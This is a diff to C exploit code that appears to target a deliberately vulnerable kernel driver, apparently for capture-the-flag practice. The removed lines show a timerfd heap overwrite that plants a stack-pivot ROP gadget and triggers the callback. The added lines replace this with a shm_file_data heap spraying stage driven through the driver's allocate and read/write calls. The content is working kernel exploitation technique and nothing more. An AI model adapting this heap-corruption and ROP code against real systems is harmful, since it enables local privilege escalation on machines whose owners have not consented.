@@ -4,11 +4,13 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <errno.h>
-#include <sys/timerfd.h>
 #include <time.h>
 #include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/shm.h>
 
 #include "../heap.h"
+#include "sof.h"
 
 #define MAX_ADDRESSES 1024
 
@@ -124,30 +126,26 @@ void driver_read_write(void* to, void* from, size_t size){
 	free(rw);
 }
 
-void create_timer_instance(){
-	int tfd;
-	struct itimerspec i;
-
-	i.it_interval.tv_sec = 0;
-	i.it_interval.tv_nsec = 0;
-	i.it_value.tv_sec = 5;
-	i.it_value.tv_nsec = 0;
-
-	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
-	timerfd_settime(tfd, 0, &i, 0);
+void create_shm_file_data(int id){
+	void * ret;
+	ret = shmat(id, NULL, SHM_RDONLY);
+	if((long)ret == -1){
+		printf("[-] Failed to allocate shm_file_struct\n");
+		perror("shm");
+	}
 }
 
 int main(){
 	int ret;
 	struct iomalloc *iom;
-	unsigned long target[64] = {0};
-	unsigned long payload[38] = {0};
-	unsigned int off = 32;
+	unsigned long target[4] = {0};
+	unsigned long payload[4] = {0};
+	unsigned int off = 4;
 
 	save_state();
 	create_rop_mem();
 
-	for(int i=0; i < 32; i++){
+	for(int i=0; i < 4; i++){
 		payload[i] = 0x4141414141414141;
 	}
 
@@ -167,28 +165,14 @@ int main(){
 		exit(-1);
 	}
 
-	iom->size = 256;
+	iom->size = 32;
 	iom->addr = NULL;
 
+	
+	printf("[+] Creating shm_file_data struct...\n");
+	create_shm_file_data(5000);
 	printf("[+] Allocating address...\n");
 	driver_alloc(iom);
-	printf("[+] Creating timerfd struct...\n");
-	create_timer_instance();
-	printf("[+] Overloading timerfd...\n");
-	driver_read_write(target, iom->addr, 512);
-	for(int i = 0; i < 5; i++){
-		payload[off] = target[off];
-		off++;
-	}
-	payload[off] = stacklift;
-
-	printf("off=%d\n", off);
-	printf("%p\n", (void*)stacklift);
-
-	printf("[+] Sending payload to the driver...\n");
-	driver_read_write(iom->addr, payload, 304);
-	printf("[+] Triggering timerfd callback...\n");
-	sleep(5);
 
 	driver_free((unsigned long)iom->addr);
 
